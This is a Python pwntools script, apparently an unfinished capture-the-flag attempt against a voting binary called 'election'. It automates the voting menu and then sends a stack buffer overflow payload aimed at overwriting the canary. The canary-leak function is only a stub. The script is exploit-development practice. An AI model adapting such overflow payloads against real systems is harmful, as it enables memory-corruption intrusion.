from pwn import *

context.clear(arch='x86_64')

r = process('./election')
# r = remote('', 10180)

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

# accumulate vote for enough space to write buffer
cnt = 0
def vote():
    # in voting function
    global cnt
    for do_vote in range(0, 10):
        r.sendlineafter('>', '1')
        # Candidates:
        # print(r.recvline())
        # print(r.recvline())
        # print(r.recv())
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()

    r.sendlineafter('>', '3')

# write buffer to leak canary info
def buf_canary():
    r.sendlineafter('>', '2')

    # The more votes.... say!
    r.sendlineafter('9]: ', '1')

    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
    # To Angelboy:
    r.recv()
    r.sendline('A' * 0xe8 + 'B' * 8)

    # Done!
    print('Done: --> ', r.recv())

    # quit voting --> SIGABRT occurred
    pause()
    r.sendline('3')
    print(r.recv())

canary = ''
guess = 0
def hack_canary():
    return 0

def main():
    for token_cnt in range(0, 25):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[token_cnt])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[token_cnt])
        vote()

    # check vote result
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', token[26])
    r.sendlineafter('>', '1')
    r.sendlineafter('Token: ', token[26])
    r.sendlineafter('>', '1')
    print(r.recv())
    print(r.recv())
    r.sendline('1')
    r.recvline()

    buf_canary()
    r.sendlineafter('>', '3')

main()
r.sendlineafter('>', '3')
print('final')
r.close()
